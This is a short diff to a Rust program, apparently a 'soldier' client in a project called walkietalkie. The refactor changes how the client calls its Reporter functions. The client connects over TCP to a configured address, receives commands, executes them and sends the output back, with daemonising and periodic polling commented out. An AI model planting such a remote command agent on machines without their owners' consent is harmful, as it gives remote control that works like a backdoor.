@@ -7,8 +7,7 @@
 
 //use log::info;
 use simple_logger::SimpleLogger;
-
-use walkietalkie::soldier;
+use walkietalkie::{Reporter, soldier::Soldier};
 
 fn main() {
 SimpleLogger::new().init().unwrap();
@@ -30,12 +29,12 @@ let daemonize = Daemonize::new()
 match daemonize.start() {
   Ok(_) => {
     loop {*/
-      let config = soldier::Soldier::config();
-      let tcp_stream = walkietalkie::walkietalkie::Soldier::connect(config.addr.clone());
-      let commands_recieved = walkietalkie::walkietalkie::Soldier::receive_commands(&tcp_stream).unwrap();
-      let commands_output = soldier::Soldier::run_commands(commands_recieved);
-      let _bytes_sent = walkietalkie::walkietalkie::Soldier::send_report(&tcp_stream, commands_output).unwrap();
-      walkietalkie::walkietalkie::Soldier::desconnect(&tcp_stream);
+      let config = Soldier::config();
+      let tcp_stream = Reporter::connect(config.addr.clone());
+      let commands_recieved = Reporter::receive_commands(&tcp_stream).unwrap();
+      let commands_output = Soldier::run_commands(commands_recieved);
+      let _bytes_sent = Reporter::send_report(&tcp_stream, commands_output).unwrap();
+      Reporter::desconnect(&tcp_stream);
       /*
       thread::sleep(time::Duration::from_secs(config.interval));
     }
